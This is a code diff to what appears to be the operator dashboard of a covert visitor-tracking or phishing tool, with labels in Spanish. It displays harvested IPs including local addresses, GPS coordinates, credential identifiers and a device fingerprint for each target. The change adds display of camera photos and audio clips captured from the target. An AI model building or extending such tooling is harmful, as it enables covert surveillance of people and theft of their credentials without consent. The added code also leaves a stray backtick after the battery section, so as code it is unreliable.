@@ -207,7 +207,7 @@ function card(id,d){
   </div>
   <div class="cb" id="cb-${id}">
     <div class="st">🌐 Red / IP</div>
-    <div class="grid">${R([['ip','a'],['ipLocal1','a2'],['ipLocal2','a2'],['ipLocal3','a2'],['city',''],['country',''],['region',''],['org',''],['asn','d'],['postal','d'],['ipTZ','d'],['lat','d'],['lon','d']])}</div>
+    <div class="grid">${R([['ip','a'],['ipL1','a2'],['ipL2','a2'],['ipL3','a2'],['ipLocal1','a2'],['ipLocal2','a2'],['city',''],['country',''],['region',''],['org',''],['asn','d'],['postal','d'],['ipTZ','d'],['lat','d'],['lon','d']])}</div>
     ${gmap}
     ${hasGPS?`<div class="st">📍 GPS Real</div><div class="grid">${R([['gpsLat','g'],['gpsLon','g'],['lat','g'],['lon','g'],['gps_lat','g'],['gpsAcc',''],['gpsAlt',''],['gpsSpd',''],['gpsHead',''],['gps','']])}</div>`:''}
     ${hasG?`
@@ -226,7 +226,22 @@ function card(id,d){
     ${hasCr?`<div class="st">🗝 Credenciales</div><div class="grid">${R([['credId','p'],['credName',''],['credType','d']])}</div>`:''}
     <div class="st">🖥 Dispositivo</div>
     <div class="grid">${R([['ua','d'],['platform',''],['vendor',''],['screen',''],['dpr',''],['orient',''],['depth','d'],['cores',''],['memory',''],['touch',''],['innerW','d'],['innerH','d']])}</div>
-    ${hasBat?`<div class="st">🔋 Batería</div><div class="grid">${R([['bat','y'],['batChg',''],['batDisT','d']])}</div>`:''}
+    ${ok(d.photoUrl)||ok(d.audioUrl)?`
+    <div class="st">📷 Medios capturados</div>
+    <div class="grid">
+      ${ok(d.photoUrl)?`<div class="fr" style="grid-column:1/-1">
+        <span class="fl">Foto cámara</span>
+        <a href="${d.photoUrl}" target="_blank" style="margin-top:4px">
+          <img src="${d.photoUrl}" style="max-width:200px;max-height:160px;border-radius:8px;border:1px solid #2a2a2a;" onerror="this.style.display='none'">
+        </a>
+      </div>`:''}
+      ${ok(d.audioUrl)?`<div class="fr" style="grid-column:1/-1">
+        <span class="fl">Audio clip</span>
+        <audio controls src="${d.audioUrl}" style="margin-top:4px;width:100%;max-width:280px;"></audio>
+      </div>`:''}
+    </div>`:''
+    }
+    ${hasBat?`<div class="st">🔋 Batería</div><div class="grid">${R([['bat','y'],['batChg',''],['batDisT','d']])}</div>`:''}`
     <div class="st">🌍 Idioma / Zona</div>
     <div class="grid">${R([['lang',''],['langs','d'],['tz',''],['tzOffset',''],['locale',''],['dark','']])}</div>
     <div class="st">⚙ Conectividad</div>
